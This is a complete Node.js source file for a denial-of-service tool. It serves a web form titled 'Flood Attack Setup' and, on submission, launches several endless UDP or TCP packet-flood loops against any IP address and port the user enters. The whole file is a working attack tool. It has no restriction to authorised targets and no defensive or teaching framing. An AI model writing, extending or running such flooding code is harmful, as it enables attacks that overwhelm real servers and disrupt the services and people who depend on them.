const http = require('http');
const url = require('url');
const dgram = require('dgram');
const net = require('net');

const defaultTimes = 500;
const defaultThreads = 5;

let floodInstances = [];

const runUDP = (ip, port, times) => {
  const data = Buffer.alloc(1024, 'X');
  const client = dgram.createSocket('udp4');

  const flood = () => {
    let i = Math.random() > 0.5 ? "[*]" : "[#]";
    setInterval(() => {
      for (let x = 0; x < times; x++) {
        client.send(data, 0, data.length, port, ip, (err) => {
          if (err) {
            console.error("[!] Error!!!");
            client.close();
          }
        });
      }
      console.log(i + " Sent!!!");
    }, 0);
  };

  floodInstances.push(flood);
  flood();
};

const runTCP = (ip, port, times) => {
  const data = Buffer.alloc(16, 'X');

  const flood = () => {
    let i = Math.random() > 0.5 ? "[*]" : "[#]";
    const client = new net.Socket();

    client.connect(port, ip, () => {
      setInterval(() => {
        for (let x = 0; x < times; x++) {
          client.write(data);
        }
        console.log(i + " Sent!!!");
      }, 0);
    });

    client.on('error', () => {
      console.error("[*] Error");
      client.destroy();
    });
  };

  floodInstances.push(flood);
  flood();
};

const requestListener = (req, res) => {
  const query = url.parse(req.url, true).query;
  
  if (req.url.startsWith('/flood')) {
    const ip = query.ip;
    const port = parseInt(query.port, 10);
    const protocol = query.protocol || 'udp';

    if (!ip || isNaN(port) || port <= 0 || port > 65535) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('Invalid parameters. Usage: /flood?ip=<IP>&port=<port>&protocol=<udp|tcp>');
      return;
    }

    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`Starting ${protocol.toUpperCase()} flood on ${ip}:${port}`);

    for (let y = 0; y < defaultThreads; y++) {
      if (protocol.toLowerCase() === 'udp') {
        runUDP(ip, port, defaultTimes);
      } else {
        runTCP(ip, port, defaultTimes);
      }
    }
  } else {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <html>
      <body>
        <h1>Flood Attack Setup</h1>
        <form action="/flood">
          IP Address: <input type="text" name="ip"><br>
          Port: <input type="text" name="port"><br>
          Protocol: <select name="protocol">
                      <option value="udp">UDP</option>
                      <option value="tcp">TCP</option>
                    </select><br>
          <input type="submit" value="Start Flood">
        </form>
      </body>
      </html>
    `);
  }
};

const server = http.createServer(requestListener);

server.listen(8080, () => {
  console.log('Server is listening on port 8080');
});
